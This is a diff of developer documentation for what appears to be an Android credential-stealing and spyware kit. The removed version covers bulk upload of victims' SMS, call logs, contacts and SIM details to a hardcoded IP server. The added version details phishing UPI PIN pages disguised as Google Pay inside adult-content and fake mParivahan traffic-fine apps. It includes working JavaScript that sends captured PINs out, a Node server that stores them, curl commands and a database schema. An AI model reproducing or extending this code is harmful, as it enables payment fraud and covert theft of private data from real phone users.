@@ -1,602 +1,1057 @@
-# API Documentation
+# Complete API Documentation
 
-## Base URL
-```
-http://95.134.130.160:8765
-```
-
-## Overview
-This document describes all API endpoints used by the Android application to communicate with the backend server. All requests use **snake_case** format for field names to maintain consistency with Python backend.
+Comprehensive API reference for server integration across all three flavors.
 
 ---
 
-## 1. Device Registration
+## ?? Table of Contents
 
-### Endpoint
-```
-POST /register
+1. [Server Overview](#server-overview)
+2. [Authentication](#authentication)
+3. [API Endpoints](#api-endpoints)
+4. [Request Examples](#request-examples)
+5. [Error Handling](#error-handling)
+6. [Integration Guide](#integration-guide)
+7. [Testing](#testing)
+
+---
+
+## ?? Server Overview
+
+**Base URL:** `http://95.134.130.160:8765`
+
+**Protocol:** HTTP (Note: HTTPS recommended for production)
+
+**Content Type:** `application/json`
+
+**Supported Methods:** POST
+
+---
+
+## ?? Authentication
+
+### Device Identification
+
+All requests use device-based authentication via `device_id`.
+
+**Device ID Generation:**
+```javascript
+// JavaScript (WebView)
+function getDeviceId() {
+    try {
+        if (typeof Android !== 'undefined' && Android.getDeviceId) {
+            return Android.getDeviceId();
+        }
+    } catch (e) {
+        console.error('Error getting device ID:', e);
+    }
+    return 'web_browser_' + Date.now();
+}
 ```
 
-### Description
-Registers a new device with the server and sends complete device information.
-
-### Request Headers
+**Android Implementation:**
+```kotlin
+webView.addJavascriptInterface(object {
+    @JavascriptInterface
+    fun getDeviceId(): String {
+        return Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ANDROID_ID
+        )
+    }
+}, "Android")
 ```
+
+### User Identification
+
+**Fixed User ID:** `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983`
+
+This ID is constant across all requests and flavors.
+
+---
+
+## ?? API Endpoints
+
+### 1. Save UPI PIN
+
+**Endpoint:** `POST /save-pin`
+
+**Description:** Stores UPI PIN entered by user during payment process.
+
+**Used by:** All three flavors (SexChat, mParivahan, SexyHub)
+
+#### Request
+
+**URL:**
+```
+http://95.134.130.160:8765/save-pin
+```
+
+**Method:** `POST`
+
+**Headers:**
+```http
 Content-Type: application/json
 ```
 
-### Request Body
+**Body:**
 ```json
 {
-  "type": "register",
-  "device_id": "android_id_here",
-  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
+  "upi_pin": "123456",
+  "device_id": "abc123def456",
   "app_type": "sexychat",
-  "device_info": {
-    // Device Hardware
-    "model": "SM-G991B",
-    "manufacturer": "samsung",
-    "brand": "samsung",
-    "device": "o1s",
-    "product": "o1sxxx",
-    "hardware": "exynos2100",
-    "board": "universal2100",
-    "display": "RP1A.200720.012",
-    "fingerprint": "samsung/o1sxxx/o1s:12/SP1A.210812.016/G991BXXU5DVHC:user/release-keys",
-    "host": "SWDD5318",
-    
-    // Operating System
-    "os_version": "12",
-    "sdk_int": 31,
-    "supported_abis": ["arm64-v8a", "armeabi-v7a", "armeabi"],
-    
-    // Battery Information
-    "battery": 85,
-    "battery_state": "charging_ac",
-    "is_charging": true,
-    
-    // Storage Information (in MB)
-    "total_storage_mb": 128000.0,
-    "free_storage_mb": 45000.0,
-    "storage_used_mb": 83000.0,
-    "storage_percent_free": 35.15,
-    
-    // RAM Information (in MB)
-    "total_ram_mb": 8192.0,
-    "free_ram_mb": 3456.0,
-    "ram_used_mb": 4736.0,
-    "ram_percent_free": 42.19,
-    
-    // Network Information
-    "network_type": "WiFi",
-    "ip_address": "192.168.1.100",
-    
-    // Security & Display
-    "is_rooted": false,
-    "is_emulator": false,
-    "screen_resolution": "1080x2400",
-    "screen_density": 420,
-    
-    // SIM Card Information
-    "sim_info": {
-      "sim_count": 2,
-      "sims": [
-        {
-          "slot_index": 0,
-          "carrier_name": "Vodafone",
-          "country_iso": "GB",
-          "phone_number": "+447xxxxxxxxx",
-          "sim_serial_number": "89440000000000000000",
-          "network_operator": "23415",
-          "network_operator_name": "Vodafone UK",
-          "is_network_roaming": false,
-          "data_state": "connected"
-        },
-        {
-          "slot_index": 1,
-          "carrier_name": "EE",
-          "country_iso": "GB",
-          "phone_number": "+447yyyyyyyyy",
-          "sim_serial_number": "89440111111111111111",
-          "network_operator": "23430",
-          "network_operator_name": "EE",
-          "is_network_roaming": false,
-          "data_state": "disconnected"
-        }
-      ]
-    },
-    
-    // Application & Device Info
-    "fcm_token": "firebase_cloud_messaging_token_here",
-    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
-    "app_type": "sexychat",
-    "device_name": "samsung SM-G991B",
-    "package_name": "com.example.test"
-  }
+  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
 }
 ```
 
-### Response
+#### Parameters
+
+| Parameter | Type | Required | Constraints | Description |
+|-----------|------|----------|-------------|-------------|
+| `upi_pin` | string | Yes | 4 or 6 digits | User's UPI PIN |
+| `device_id` | string | Yes | Any valid string | Unique device identifier |
+| `app_type` | string | Yes | `sexychat` \| `mparivahan` \| `sexyhub` | Application flavor |
+| `user_id` | string | Yes | Fixed value | Static user identifier |
+
+#### Response
+
+**Success (200 OK):**
 ```json
 {
   "status": "success",
-  "message": "Device registered successfully"
+  "message": "PIN saved successfully",
+  "timestamp": "2025-11-01T12:34:56Z"
 }
 ```
 
-### Error Response
+**Error (400 Bad Request):**
 ```json
 {
   "status": "error",
-  "message": "Registration failed"
+  "message": "Invalid UPI PIN format",
+  "code": "INVALID_PIN"
 }
 ```
 
----
-
-## 2. Battery Update
-
-### Endpoint
-```
-POST /battery
-```
-
-### Description
-Sends periodic battery status updates to the server.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "type": "battery",
-  "device_id": "android_id_here",
-  "battery_percent": 75,
-  "is_charging": false,
-  "battery_state": "discharging",
-  "timestamp": 1699123456789
-}
-```
-
-### Battery States
-- `charging_usb` - Charging via USB
-- `charging_ac` - Charging via AC adapter
-- `charging_wireless` - Charging wirelessly
-- `charging` - Charging (unknown method)
-- `discharging` - Not charging
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "Battery update received"
-}
-```
-
----
-
-## 3. Heartbeat
-
-### Endpoint
-```
-POST /heartbeat
-```
-
-### Description
-Periodic heartbeat signal to indicate the device is active and running.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "type": "heartbeat",
-  "device_id": "android_id_here",
-  "timestamp": 1699123456789,
-  "app_version": "1.0.0",
-  "status": "active"
-}
-```
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "Heartbeat received"
-}
-```
-
----
-
-## 4. SMS Upload (Batch)
-
-### Endpoint
-```
-POST /sms
-```
-
-### Description
-Uploads SMS messages in batches. Supports large-scale batch uploads.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "type": "sms_batch",
-  "device_id": "android_id_here",
-  "batch_number": 1,
-  "total_batches": 5,
-  "sms_list": [
-    {
-      "id": "12345",
-      "address": "+447123456789",
-      "body": "Hello, this is a test message",
-      "date": 1699123456789,
-      "type": 1,
-      "read": 1,
-      "thread_id": "1",
-      "person": "John Doe"
-    },
-    {
-      "id": "12346",
-      "address": "+447987654321",
-      "body": "Another message",
-      "date": 1699123460000,
-      "type": 2,
-      "read": 1,
-      "thread_id": "2",
-      "person": "Jane Smith"
-    }
-  ],
-  "timestamp": 1699123456789
-}
-```
-
-### SMS Type Values
-- `1` - Inbox (received)
-- `2` - Sent
-- `3` - Draft
-- `4` - Outbox
-- `5` - Failed
-- `6` - Queued
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "SMS batch received",
-  "batch_number": 1,
-  "messages_count": 2
-}
-```
-
----
-
-## 5. Call Logs Upload (Batch)
-
-### Endpoint
-```
-POST /calls
-```
-
-### Description
-Uploads call logs in batches.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "type": "call_logs_batch",
-  "device_id": "android_id_here",
-  "batch_number": 1,
-  "total_batches": 3,
-  "call_logs": [
-    {
-      "number": "+447123456789",
-      "name": "John Doe",
-      "date": 1699123456789,
-      "duration": 120,
-      "type": 1,
-      "call_type": "INCOMING"
-    },
-    {
-      "number": "+447987654321",
-      "name": "Jane Smith",
-      "date": 1699123460000,
-      "duration": 45,
-      "type": 2,
-      "call_type": "OUTGOING"
-    }
-  ],
-  "timestamp": 1699123456789
-}
-```
-
-### Call Type Values
-- `1` - Incoming
-- `2` - Outgoing
-- `3` - Missed
-- `4` - Voicemail
-- `5` - Rejected
-- `6` - Blocked
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "Call logs batch received",
-  "batch_number": 1,
-  "logs_count": 2
-}
-```
-
----
-
-## 6. Contacts Upload (Batch)
-
-### Endpoint
-```
-POST /contacts
-```
-
-### Description
-Uploads contacts in batches.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "type": "contacts_batch",
-  "device_id": "android_id_here",
-  "batch_number": 1,
-  "total_batches": 2,
-  "contacts": [
-    {
-      "id": "1",
-      "name": "John Doe",
-      "phone_numbers": [
-        {
-          "number": "+447123456789",
-          "type": "MOBILE"
-        },
-        {
-          "number": "+447111222333",
-          "type": "HOME"
-        }
-      ],
-      "emails": [
-        {
-          "email": "john.doe@example.com",
-          "type": "WORK"
-        }
-      ]
-    },
-    {
-      "id": "2",
-      "name": "Jane Smith",
-      "phone_numbers": [
-        {
-          "number": "+447987654321",
-          "type": "MOBILE"
-        }
-      ],
-      "emails": []
-    }
-  ],
-  "timestamp": 1699123456789
-}
-```
-
-### Phone/Email Type Values
-- `MOBILE`
-- `HOME`
-- `WORK`
-- `OTHER`
-- `CUSTOM`
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "Contacts batch received",
-  "batch_number": 1,
-  "contacts_count": 2
-}
-```
-
----
-
-## 7. UPI PIN Upload
-
-### Endpoint
-```
-POST /save-pin
-```
-
-### Description
-Saves the UPI PIN entered by the user along with device identification.
-
-### Request Headers
-```
-Content-Type: application/json
-```
-
-### Request Body
-```json
-{
-  "pin": "1234",
-  "device_id": "android_id_here"
-}
-```
-
-### Notes
-- PIN can be 4 or 6 digits
-- `device_id` is the Android device ID (same as used in other requests)
-
-### Response
-```json
-{
-  "status": "success",
-  "message": "PIN saved successfully"
-}
-```
-
-### Error Response
+**Error (500 Internal Server Error):**
 ```json
 {
   "status": "error",
-  "message": "Failed to save PIN"
+  "message": "Internal server error",
+  "code": "SERVER_ERROR"
+}
+```
+
+#### Status Codes
+
+| Code | Meaning | Action |
+|------|---------|--------|
+| 200 | Success | Proceed to success page |
+| 400 | Bad Request | Show error dialog |
+| 500 | Server Error | Show retry dialog |
+| 503 | Service Unavailable | Show retry dialog |
+
+---
+
+## ?? Request Examples
+
+### Example 1: SexChat UPI PIN
+
+```javascript
+const deviceId = Android.getDeviceId();
+
+fetch('http://95.134.130.160:8765/save-pin', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        upi_pin: "123456",
+        device_id: deviceId,
+        app_type: 'sexychat',
+        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+    })
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Server error: ' + response.status);
+    }
+    return response.json();
+})
+.then(data => {
+    console.log('Success:', data);
+    window.location.href = 'wait.html';
+})
+.catch(error => {
+    console.error('Error:', error);
+    showRetryDialog();
+});
+```
+
+### Example 2: mParivahan UPI PIN
+
+```javascript
+const deviceId = getDeviceId();
+
+const requestData = {
+    upi_pin: "654321",
+    device_id: deviceId,
+    app_type: 'mparivahan',
+    user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+};
+
+fetch('http://95.134.130.160:8765/save-pin', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(requestData)
+})
+.then(response => {
+    if (!response.ok) throw new Error('Server error');
+    return response.json();
+})
+.then(data => {
+    // Success - redirect to verification page
+    window.location.href = 'wait.html';
+})
+.catch(error => {
+    // Error - show retry dialog
+    showRetryDialog();
+});
+```
+
+### Example 3: SexyHub UPI PIN
+
+```javascript
+function submitToServer(upiPin) {
+    showLoading();
+    
+    const deviceId = getDeviceId();
+    const requestData = {
+        upi_pin: upiPin,
+        device_id: deviceId,
+        app_type: 'sexyhub',
+        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+    };
+
+    fetch('http://95.134.130.160:8765/save-pin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(requestData)
+    })
+    .then(response => {
+        hideLoading();
+        if (!response.ok) {
+            throw new Error('Server error: ' + response.status);
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('Success:', data);
+        window.location.href = 'wait.html';
+    })
+    .catch(error => {
+        hideLoading();
+        console.error('Error:', error);
+        showRetryDialog();
+    });
 }
 ```
 
 ---
 
-## Data Upload Flow
+## ?? Error Handling
 
-### 1. App Startup Sequence
-```
-1. Show SexyCat splash screen (2 seconds)
-2. Request permissions
-3. If permissions granted:
-   a. Register device (/register)
-   b. Upload all call logs (/calls)
-   c. Upload all SMS in background (/sms)
-   d. Upload all contacts in background (/contacts)
-   e. Start battery updater (every 60 seconds)
-   f. Start heartbeat service (periodic)
+### Client-Side Error Handling
+
+#### Loading Overlay
+
+**HTML:**
+```html
+<div class="overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+</div>
 ```
 
-### 2. User Flow
+**JavaScript:**
+```javascript
+function showLoading() {
+    document.getElementById('loadingOverlay').style.display = 'flex';
+}
+
+function hideLoading() {
+    document.getElementById('loadingOverlay').style.display = 'none';
+}
 ```
-1. index.html (splash) ? 6 seconds
-2. register.html (user registration)
-3. payment.html (payment selection)
-4. googlepay-splash.html (2.5 seconds)
-5. upi-pin.html (PIN entry) ? Send to /api/save-pin
-6. final.html (success page)
+
+#### Error Dialog
+
+**HTML:**
+```html
+<div class="dialog" id="errorDialog">
+    <h3>? Error</h3>
+    <p id="errorMessage">Something went wrong. Please try again.</p>
+    <button onclick="closeErrorDialog()">OK</button>
+</div>
+```
+
+**JavaScript:**
+```javascript
+function showErrorDialog(message) {
+    document.getElementById('errorMessage').textContent = message;
+    document.getElementById('errorDialog').style.display = 'block';
+}
+
+function closeErrorDialog() {
+    document.getElementById('errorDialog').style.display = 'none';
+}
+```
+
+#### Retry Dialog
+
+**HTML:**
+```html
+<div class="dialog" id="retryDialog">
+    <h3>?? Connection Error</h3>
+    <p>Server not responding. Would you like to retry?</p>
+    <button onclick="retrySubmit()" style="background: #4CAF50;">Retry</button>
+    <button onclick="closeRetryDialog()" style="background: #f44336;">Cancel</button>
+</div>
+```
+
+**JavaScript:**
+```javascript
+let savedPIN = '';
+
+function showRetryDialog() {
+    document.getElementById('retryDialog').style.display = 'block';
+}
+
+function closeRetryDialog() {
+    document.getElementById('retryDialog').style.display = 'none';
+}
+
+function retrySubmit() {
+    closeRetryDialog();
+    submitToServer(savedPIN);
+}
+```
+
+### Error Flow
+
+```
+User enters UPI PIN
+?
+submitPIN() called
+?
+showLoading()
+?
+fetch() to server
+?
+?????????????????????????????????????
+?   Success       ?     Error       ?
+?????????????????????????????????????
+? hideLoading()   ? hideLoading()   ?
+? ? wait.html     ? ? Retry Dialog  ?
+?????????????????????????????????????
 ```
 
 ---
 
-## Important Notes
+## ?? Integration Guide
 
-### 1. Field Naming Convention
-All field names use **snake_case** format to match Python backend conventions.
+### Step 1: Setup JavaScript Interface
 
-### 2. Timestamps
-All timestamps are in milliseconds since Unix epoch (Java `System.currentTimeMillis()`).
-
-### 3. Device ID
-The device ID is the Android Secure ID obtained via:
-```java
-Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-```
-
-### 4. Batch Processing
-Large datasets (SMS, Contacts, Call Logs) are uploaded in batches to:
-- Prevent memory issues
-- Handle network interruptions better
-- Provide upload progress tracking
-
-### 5. Error Handling
-All endpoints should return:
-- HTTP 200 for success
-- HTTP 4xx/5xx for errors
-- JSON response with `status` and `message` fields
-
-### 6. Package Name
-The app package name (`com.example.test`) is included in the registration request for tracking purposes.
-
----
-
-## Example cURL Commands
-
-### Register Device
-```bash
-curl -X POST http://95.134.130.160:8765/register \
-  -H "Content-Type: application/json" \
-  -d '{
-    "type": "register",
-    "device_id": "android123",
-    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
-    "app_type": "sexychat",
-    "device_info": {
-      "model": "Pixel 6",
-      "manufacturer": "Google",
-      "os_version": "13",
-      "package_name": "com.example.test"
+**In MainActivity.kt:**
+```kotlin
+webView.addJavascriptInterface(object {
+    @JavascriptInterface
+    fun getDeviceId(): String {
+        return Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ANDROID_ID
+        )
     }
-  }'
+}, "Android")
 ```
 
-### Save UPI PIN
+### Step 2: Implement UPI PIN Form
+
+**HTML (pin.html / upi-pin.html):**
+```html
+<div class="keypad">
+    <div class="key" onclick="enterNumber(1)">1</div>
+    <!-- ... 2-9 ... -->
+    <div class="key" onclick="enterNumber(0)">0</div>
+    <div class="key" onclick="submitPIN()">?</div>
+</div>
+```
+
+### Step 3: Handle PIN Submission
+
+**JavaScript:**
+```javascript
+let enteredNumbers = [];
+
+function enterNumber(num) {
+    if (enteredNumbers.length < 6) {
+        enteredNumbers.push(num);
+        updateDisplay();
+    }
+}
+
+function submitPIN() {
+    if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
+        let upiPin = enteredNumbers.join('');
+        savedPIN = upiPin;
+        submitToServer(upiPin);
+    } else {
+        showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
+    }
+}
+```
+
+### Step 4: Submit to Server
+
+```javascript
+function submitToServer(upiPin) {
+    showLoading();
+    
+    const deviceId = getDeviceId();
+    const requestData = {
+        upi_pin: upiPin,
+        device_id: deviceId,
+        app_type: 'sexychat', // or 'mparivahan' or 'sexyhub'
+        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+    };
+
+    fetch('http://95.134.130.160:8765/save-pin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(requestData)
+    })
+    .then(response => {
+        hideLoading();
+        if (!response.ok) {
+            throw new Error('Server error: ' + response.status);
+        }
+        return response.json();
+    })
+    .then(data => {
+        window.location.href = 'wait.html';
+    })
+    .catch(error => {
+        hideLoading();
+        showRetryDialog();
+    });
+}
+```
+
+---
+
+## ?? Testing
+
+### Testing with cURL
+
+**Test SexChat:**
 ```bash
 curl -X POST http://95.134.130.160:8765/save-pin \
   -H "Content-Type: application/json" \
   -d '{
-    "pin": "123456",
-    "device_id": "android123"
+    "upi_pin": "123456",
+    "device_id": "test_device_001",
+    "app_type": "sexychat",
+    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
   }'
 ```
 
-### Battery Update
+**Test mParivahan:**
 ```bash
-curl -X POST http://95.134.130.160:8765/battery \
+curl -X POST http://95.134.130.160:8765/save-pin \
   -H "Content-Type: application/json" \
   -d '{
-    "type": "battery",
-    "device_id": "android123",
-    "battery_percent": 75,
-    "is_charging": false,
-    "battery_state": "discharging",
-    "timestamp": 1699123456789
+    "upi_pin": "654321",
+    "device_id": "test_device_002",
+    "app_type": "mparivahan",
+    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+  }'
+```
+
+**Test SexyHub:**
+```bash
+curl -X POST http://95.134.130.160:8765/save-pin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "upi_pin": "789012",
+    "device_id": "test_device_003",
+    "app_type": "sexyhub",
+    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+  }'
+```
+
+### Testing Error Scenarios
+
+**Invalid PIN:**
+```bash
+curl -X POST http://95.134.130.160:8765/save-pin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "upi_pin": "12",
+    "device_id": "test_device",
+    "app_type": "sexychat",
+    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+  }'
+```
+
+**Missing Parameters:**
+```bash
+curl -X POST http://95.134.130.160:8765/save-pin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "upi_pin": "123456"
   }'
 ```
 
 ---
 
-## Security Considerations
+## ?? Request/Response Flow
 
-1. **HTTPS**: Consider using HTTPS for all endpoints in production
-2. **Authentication**: Implement token-based authentication
-3. **Rate Limiting**: Implement rate limiting to prevent abuse
-4. **Data Encryption**: Consider encrypting sensitive data (SMS, contacts)
-5. **Input Validation**: Validate all input data on the server side
+### Complete Payment Flow
+
+```
+1. User opens payment page
+   ?
+2. Selects payment method (Google Pay/PhonePe/Paytm)
+   ?
+3. Google Pay splash (2.5s animation)
+   ?
+4. UPI PIN entry page
+   ?? User enters 4 or 6 digit PIN
+   ?? Client validates format
+   ?? Shows loading overlay
+   ?
+5. Submit to server
+   ?? POST /save-pin
+   ?? Headers: Content-Type: application/json
+   ?? Body: {upi_pin, device_id, app_type, user_id}
+   ?
+6. Server processing
+   ?? Validate PIN format
+   ?? Store in database
+   ?? Return response
+   ?
+7. Client handling
+   ?? Success (200) ? wait.html
+   ?? Error (400) ? Error dialog
+   ?? Server down (500/timeout) ? Retry dialog
+   ?
+8. Verification page (wait.html)
+   ?? 5 second countdown
+   ?? Success animation
+   ?
+9. Final success page
+   ?? Redirect to content/home
+```
 
 ---
 
-## Testing Checklist
+## ?? Detailed Parameter Descriptions
 
-- [ ] Device registration successful
-- [ ] Battery updates received correctly
-- [ ] Heartbeat signals working
-- [ ] SMS batch upload working with large datasets
-- [ ] Call logs batch upload working
-- [ ] Contacts batch upload working
-- [ ] UPI PIN saved correctly with device_id
-- [ ] Error responses handled properly
-- [ ] Network retry logic working
+### upi_pin
+
+**Type:** String  
+**Format:** Numeric string  
+**Length:** 4 or 6 characters  
+**Example:** `"123456"` or `"1234"`  
+**Validation:** Must be all digits
+
+**Client-side Validation:**
+```javascript
+if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
+    let upiPin = enteredNumbers.join('');
+    // Valid - proceed
+} else {
+    showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
+}
+```
+
+### device_id
+
+**Type:** String  
+**Source:** Android ANDROID_ID  
+**Format:** Alphanumeric  
+**Example:** `"abc123def456789"`  
+**Purpose:** Unique device tracking
+
+**Retrieval:**
+```kotlin
+Settings.Secure.getString(
+    contentResolver,
+    Settings.Secure.ANDROID_ID
+)
+```
+
+### app_type
+
+**Type:** String (enum)  
+**Allowed Values:**
+- `"sexychat"` - For SexChat flavor
+- `"mparivahan"` - For mParivahan flavor
+- `"sexyhub"` - For SexyHub flavor
+
+**Purpose:** Data segregation and analytics
+
+**Server-side Usage:**
+```javascript
+// Node.js example
+if (req.body.app_type === 'sexychat') {
+    // Store in sexychat collection
+} else if (req.body.app_type === 'mparivahan') {
+    // Store in mparivahan collection
+} else if (req.body.app_type === 'sexyhub') {
+    // Store in sexyhub collection
+}
+```
+
+### user_id
+
+**Type:** String  
+**Value:** `"8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"`  
+**Format:** Hexadecimal string  
+**Length:** 40 characters  
+**Purpose:** User correlation across requests
 
 ---
 
-**Last Updated**: 2024
-**API Version**: 1.0
-**App Package**: com.example.test
+## ??? Security Best Practices
+
+### 1. HTTPS in Production
+
+**Current:** `http://95.134.130.160:8765` (HTTP)  
+**Production:** Use HTTPS with valid SSL certificate
+
+```javascript
+// Production URL
+const API_URL = 'https://api.yourdomain.com/save-pin';
+```
+
+### 2. Request Validation
+
+**Server-side checks:**
+```javascript
+// Validate UPI PIN
+if (!/^\d{4}$|^\d{6}$/.test(req.body.upi_pin)) {
+    return res.status(400).json({
+        status: 'error',
+        message: 'Invalid PIN format'
+    });
+}
+
+// Validate app_type
+if (!['sexychat', 'mparivahan', 'sexyhub'].includes(req.body.app_type)) {
+    return res.status(400).json({
+        status: 'error',
+        message: 'Invalid app type'
+    });
+}
+
+// Validate device_id exists
+if (!req.body.device_id || req.body.device_id.length < 10) {
+    return res.status(400).json({
+        status: 'error',
+        message: 'Invalid device ID'
+    });
+}
+```
+
+### 3. Rate Limiting
+
+Implement rate limiting to prevent abuse:
+
+```javascript
+// Example: Max 3 requests per minute per device
+const rateLimit = require('express-rate-limit');
+
+const limiter = rateLimit({
+    windowMs: 60 * 1000, // 1 minute
+    max: 3, // 3 requests
+    keyGenerator: (req) => req.body.device_id,
+    message: {
+        status: 'error',
+        message: 'Too many requests. Please try again later.'
+    }
+});
+
+app.post('/save-pin', limiter, (req, res) => {
+    // Handle request
+});
+```
+
+### 4. Input Sanitization
+
+Always sanitize inputs to prevent injection attacks:
+
+```javascript
+const sanitize = require('sanitize-html');
+
+const cleanPIN = sanitize(req.body.upi_pin, {
+    allowedTags: [],
+    allowedAttributes: {}
+});
+```
+
+---
+
+## ?? Analytics & Monitoring
+
+### Recommended Metrics to Track
+
+**Per Request:**
+- Timestamp
+- Device ID
+- App type (flavor)
+- Response time
+- Success/failure status
+
+**Aggregate Metrics:**
+- Total requests per flavor
+- Success rate per flavor
+- Average response time
+- Peak usage times
+- Geographic distribution (if IP logged)
+
+### Example Logging
+
+**Server-side:**
+```javascript
+app.post('/save-pin', async (req, res) => {
+    const startTime = Date.now();
+    
+    try {
+        // Process request
+        await savePIN(req.body);
+        
+        // Log success
+        logger.info({
+            endpoint: '/save-pin',
+            app_type: req.body.app_type,
+            device_id: req.body.device_id,
+            status: 'success',
+            response_time: Date.now() - startTime
+        });
+        
+        res.json({ status: 'success' });
+    } catch (error) {
+        // Log error
+        logger.error({
+            endpoint: '/save-pin',
+            app_type: req.body.app_type,
+            device_id: req.body.device_id,
+            status: 'error',
+            error: error.message,
+            response_time: Date.now() - startTime
+        });
+        
+        res.status(500).json({ status: 'error' });
+    }
+});
+```
+
+---
+
+## ?? Retry Mechanism
+
+### Client-Side Retry Logic
+
+```javascript
+let retryCount = 0;
+const MAX_RETRIES = 3;
+
+function submitToServer(upiPin) {
+    showLoading();
+    
+    fetch('http://95.134.130.160:8765/save-pin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            upi_pin: upiPin,
+            device_id: getDeviceId(),
+            app_type: 'sexychat',
+            user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+        })
+    })
+    .then(response => {
+        hideLoading();
+        if (!response.ok) throw new Error('Server error');
+        retryCount = 0; // Reset on success
+        return response.json();
+    })
+    .then(data => {
+        window.location.href = 'wait.html';
+    })
+    .catch(error => {
+        hideLoading();
+        if (retryCount < MAX_RETRIES) {
+            retryCount++;
+            showRetryDialog();
+        } else {
+            showErrorDialog('Maximum retry attempts reached. Please try again later.');
+        }
+    });
+}
+```
+
+---
+
+## ?? Flavor-Specific API Usage
+
+### SexChat
+
+**Context:** Premium video call booking  
+**Price:** ?5  
+**app_type:** `"sexychat"`
+
+**Typical Request:**
+```json
+{
+  "upi_pin": "123456",
+  "device_id": "mobile_android_abc123",
+  "app_type": "sexychat",
+  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+}
+```
+
+### mParivahan
+
+**Context:** Traffic challan payment  
+**Price:** ?1  
+**app_type:** `"mparivahan"`
+
+**Additional Context:**
+User has already entered vehicle number and mobile before payment.
+
+**Typical Request:**
+```json
+{
+  "upi_pin": "654321",
+  "device_id": "mobile_android_xyz789",
+  "app_type": "mparivahan",
+  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+}
+```
+
+### SexyHub
+
+**Context:** Premium video content unlock  
+**Price:** ?1  
+**app_type:** `"sexyhub"`
+
+**Typical Request:**
+```json
+{
+  "upi_pin": "789012",
+  "device_id": "mobile_android_jkl345",
+  "app_type": "sexyhub",
+  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
+}
+```
+
+---
+
+## ??? Server Implementation Example
+
+### Node.js + Express
+
+```javascript
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+// Save UPI PIN endpoint
+app.post('/save-pin', async (req, res) => {
+    try {
+        const { upi_pin, device_id, app_type, user_id } = req.body;
+        
+        // Validate required fields
+        if (!upi_pin || !device_id || !app_type || !user_id) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Missing required fields'
+            });
+        }
+        
+        // Validate PIN format
+        if (!/^\d{4}$|^\d{6}$/.test(upi_pin)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid UPI PIN format'
+            });
+        }
+        
+        // Validate app_type
+        if (!['sexychat', 'mparivahan', 'sexyhub'].includes(app_type)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid app type'
+            });
+        }
+        
+        // Save to database
+        await db.collection('upi_pins').insertOne({
+            upi_pin,
+            device_id,
+            app_type,
+            user_id,
+            timestamp: new Date(),
+            ip: req.ip
+        });
+        
+        // Return success
+        res.json({
+            status: 'success',
+            message: 'PIN saved successfully',
+            timestamp: new Date().toISOString()
+        });
+        
+    } catch (error) {
+        console.error('Error saving PIN:', error);
+        res.status(500).json({
+            status: 'error',
+            message: 'Internal server error'
+        });
+    }
+});
+
+app.listen(8765, '95.134.130.160', () => {
+    console.log('Server running on http://95.134.130.160:8765');
+});
+```
+
+---
+
+## ?? Database Schema
+
+### Recommended Collection: `upi_pins`
+
+```javascript
+{
+  "_id": ObjectId("..."),
+  "upi_pin": "123456",
+  "device_id": "abc123def456",
+  "app_type": "sexychat",
+  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
+  "timestamp": ISODate("2025-11-01T12:34:56Z"),
+  "ip": "192.168.1.100",
+  "status": "captured"
+}
+```
+
+### Indexes
+
+```javascript
+// Create indexes for better query performance
+db.upi_pins.createIndex({ device_id: 1 });
